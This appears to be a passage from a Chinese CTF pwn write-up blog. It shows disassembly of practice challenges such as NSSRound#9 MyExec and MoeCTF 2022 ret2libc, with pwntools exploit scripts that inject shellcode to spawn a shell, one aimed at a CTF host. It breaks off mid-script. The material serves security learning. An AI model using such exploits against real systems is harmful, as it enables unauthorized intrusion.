<p>开启了PIE和Canary和RELRO</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00000000000011AD                 <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000011AE                 <span class="keyword">mov</span>     <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000011B1                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">70h</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000011B5                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">fs</span>:<span class="number">28h</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000011BE                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+var_8], <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000011C2                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000011C4                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">cs</span>:stdout@@GLIBC_2_2_5</span><br><span class="line"><span class="symbol">.text:</span>00000000000011CB                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="number">0</span>          <span class="comment">; buf</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000011D0                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rax</span>        <span class="comment">; stream</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000011D3                 <span class="keyword">call</span>    _setbuf</span><br><span class="line"><span class="symbol">.text:</span>00000000000011D8                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">cs</span>:stderr@@GLIBC_2_2_5</span><br><span class="line"><span class="symbol">.text:</span>00000000000011DF                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="number">0</span>          <span class="comment">; buf</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000011E4                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rax</span>        <span class="comment">; stream</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000011E7                 <span class="keyword">call</span>    _setbuf</span><br><span class="line"><span class="symbol">.text:</span>00000000000011EC                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">cs</span>:stdin@@GLIBC_2_2_5</span><br><span class="line"><span class="symbol">.text:</span>00000000000011F3                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="number">0</span>          <span class="comment">; buf</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000011F8                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rax</span>        <span class="comment">; stream</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000011FB                 <span class="keyword">call</span>    _setbuf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001200</span>                 <span class="keyword">lea</span>     <span class="built_in">rdi</span>, s          <span class="comment">; &quot;Hello! Welcome to the pwn world!&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001207</span>                 <span class="keyword">call</span>    _puts</span><br><span class="line"><span class="symbol">.text:</span>000000000000120C                 <span class="keyword">lea</span>     <span class="built_in">rdi</span>, aDoYouKnowWhatS <span class="comment">; &quot;Do you know what shellcode is?&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001213</span>                 <span class="keyword">call</span>    _puts</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001218</span>                 <span class="keyword">lea</span>     <span class="built_in">rdi</span>, aLetSHaveATry <span class="comment">; &quot;Let&#x27;s have a try!&quot;</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000121F                 <span class="keyword">call</span>    _puts</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001224</span>                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>+buf]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001228</span>                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">64h</span> <span class="comment">; &#x27;d&#x27;  ; nbytes</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000122D</span>                 <span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">rax</span>        <span class="comment">; buf</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001230</span>                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="number">0</span>          <span class="comment">; fd</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001235</span>                 <span class="keyword">call</span>    _read</span><br><span class="line"><span class="symbol">.text:</span>000000000000123A                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>+buf]</span><br><span class="line"><span class="symbol">.text:</span>000000000000123E                 <span class="keyword">call</span>    <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001240</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001245</span>                 <span class="keyword">mov</span>     <span class="built_in">rcx</span>, [<span class="built_in">rbp</span>+var_8]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001249</span>                 <span class="keyword">xor</span>     <span class="built_in">rcx</span>, <span class="built_in">fs</span>:<span class="number">28h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001252</span>                 <span class="keyword">jz</span>      short locret_1259</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001254</span>                 <span class="keyword">call</span>    ___stack_chk_fail</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">    port = <span class="number">1111</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line">info(<span class="string">&quot;rdi addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(rdi))</span><br><span class="line">sl(asm(shellcraft.sh()))</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h2 id="11-16"><a href="#11-16" class="headerlink" title="11.16"></a>11.16</h2><h3 id="NSSRound-9-Basic-MyExec"><a href="#NSSRound-9-Basic-MyExec" class="headerlink" title="[NSSRound#9 Basic]MyExec"></a>[NSSRound#9 Basic]MyExec</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001325</span>                 <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001326</span>                 <span class="keyword">mov</span>     <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001329</span>                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">10h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000132D</span> <span class="comment">; 3:   init(argc, argv, envp);</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000132D</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001332</span>                 <span class="keyword">call</span>    init</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001337</span> <span class="comment">; 4:   sandbox();</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001337</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000133C                 <span class="keyword">call</span>    sandbox</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001341</span> <span class="comment">; 5:   puts(&quot;test NSS sandbox&quot;);</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001341</span>                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, s          <span class="comment">; &quot;test NSS sandbox&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001348</span>                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rax</span>        <span class="comment">; s</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000134B                 <span class="keyword">call</span>    _puts</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001350</span> <span class="comment">; 6:   mmap((void *)0x50000, 0x1000uLL, 7, 50, -1, 0LL);</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001350</span>                 <span class="keyword">mov</span>     <span class="built_in">r9d</span>, <span class="number">0</span>          <span class="comment">; offset</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001356</span>                 <span class="keyword">mov</span>     <span class="built_in">r8d</span>, <span class="number">0FFFFFFFFh</span> <span class="comment">; fd</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000135C                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="number">32h</span> <span class="comment">; &#x27;2&#x27;  ; flags</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001361</span>                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">7</span>          <span class="comment">; prot</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001366</span>                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="number">1000h</span>      <span class="comment">; len</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000136B                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="number">50000h</span>     <span class="comment">; addr</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001370</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001375</span>                 <span class="keyword">call</span>    _mmap</span><br><span class="line"><span class="symbol">.text:</span>000000000000137A <span class="comment">; 7:   read(0, (void *)0x50000, 0x64uLL);</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000137A                 <span class="keyword">cdqe</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000137C                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+var_8], <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001380</span>                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">64h</span> <span class="comment">; &#x27;d&#x27;  ; nbytes</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001385</span>                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="number">50000h</span>     <span class="comment">; buf</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000138A                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="number">0</span>          <span class="comment">; fd</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000138F                 <span class="keyword">call</span>    _read</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001394</span> <span class="comment">; 8:   MEMORY[0x50000]();</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001394</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001399</span>                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">50000h</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000139E                 <span class="keyword">call</span>    <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000013A0 <span class="comment">; 9:   return 0;</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000013A0                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000013A5                 <span class="keyword">leave</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000013A6                 <span class="keyword">retn</span></span><br></pre></td></tr></table></figure>

<p>ret2shellcode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">    port = <span class="number">21775</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># rdi = rop.find_gadget([&#x27;pop rdi&#x27;,&#x27;ret&#x27;])[0]</span></span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line"><span class="comment"># info(&quot;rdi addr : &#123;:#x&#125;&quot;.format(rdi))</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">sl(shellcode)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="MoeCTF-2022-ret2libc"><a href="#MoeCTF-2022-ret2libc" class="headerlink" title="[MoeCTF 2022]ret2libc"></a>[MoeCTF 2022]ret2libc</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">0000000000401183</span> buf             = <span class="built_in">byte</span> <span class="built_in">ptr</span> -<span class="number">40h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000401183</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000401183</span> <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000401183</span>                 endbr64</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000401187</span>                 <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000401188</span>                 <span class="keyword">mov</span>     <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040118B                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">40h</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040118F                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, [<span class="built_in">rbp</span>+buf]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000401193</span>                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="number">70h</span> <span class="comment">; &#x27;p&#x27;  ; nbytes</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000401198</span>                 <span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">rax</span>        <span class="comment">; buf</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040119B                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="number">0</span>          <span class="comment">; fd</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004011A0                 <span class="keyword">call</span>    _read</span><br><span class="line"><span class="symbol">.text:</span>00000000004011A5                 <span class="keyword">nop</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004011A6                 <span class="keyword">leave</span></span><br><span class="line"><span class="symbol">.text:</span>00000000004011A7                 <span class="keyword">retn</span></span><br></pre></td></tr></table></figure>

<p>libc6_2.35-0ubuntu3.2_amd64</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span 